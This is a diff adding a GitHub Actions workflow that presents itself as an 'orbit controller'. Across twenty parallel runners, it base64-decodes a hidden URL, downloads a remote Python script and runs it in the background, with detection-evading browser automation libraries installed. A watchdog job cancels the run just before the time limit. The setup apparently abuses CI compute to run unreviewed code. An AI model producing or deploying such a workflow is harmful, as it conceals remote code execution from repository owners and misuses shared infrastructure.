@@ -1,0 +1,103 @@
+name: Aether Orbit Controller
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: orbit-exec-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Task 1: Timer process that aborts the workflow after 59 minutes
+  # =================================================================
+  orbit-watchdog:
+    name: "System Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      HOLD_LIMIT: 3540
+    steps:
+      - name: Initialize Watchdog Loop
+        run: |
+          echo "[WATCHDOG] Monitoring active pipeline: ${{ github.run_id }}"
+          echo "[WATCHDOG] Delaying execution for ${HOLD_LIMIT}s."
+
+          sleep "${HOLD_LIMIT}"
+
+          echo "[WATCHDOG] Threshold reached — sending abort signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHDOG] Termination signal sent to API."
+
+  # =================================================================
+  # Task 2: Parallel execution array across nodes
+  # =================================================================
+  grid-runner:
+    name: "Runner-${{ matrix.node_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_key: [a101, b102, c103, d104, e105, f106, g107, h108, i109, j110, k111, l112, m113, n114, o115, p116, q117, r118, s119, t120]
+
+    steps:
+      # -----------------------------------------------------------------
+      # Phase 1: Environment Setup
+      # -----------------------------------------------------------------
+      - name: Prepare OS Dependencies
+        run: |
+          echo "[SETUP] Updating base packages for Runner-${{ matrix.node_key }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # -----------------------------------------------------------------
+      # Phase 2: Fetch Remote Script
+      # -----------------------------------------------------------------
+      - name: Retrieve Payload Script
+        run: |
+          echo "[FETCH] Decoding target URI..."
+          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$TARGET_URL" -o app_runner.py
+          echo "[FETCH] Script saved as app_runner.py."
+
+      # -----------------------------------------------------------------
+      # Phase 3: Python Requirements
+      # -----------------------------------------------------------------
+      - name: Install Python Libraries
+        run: |
+          echo "[DEPS] Installing required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # Phase 4: Execute Process with Timeout
+      # -----------------------------------------------------------------
+      - name: Execute App Process
+        run: |
+          echo ">> Starting background task for node: ${{ matrix.node_key }}"
+
+          python3 app_runner.py &
+          TASK_PID=$!
+
+          echo ">> Task started under PID $TASK_PID. Holding for 3540 seconds..."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo ">> Timer elapsed — stopping process $TASK_PID."
+            kill -9 "$TASK_PID"
+            echo ">> Process terminated successfully."
+          else
+            echo ">> Task completed prior to timeout."
+          fi
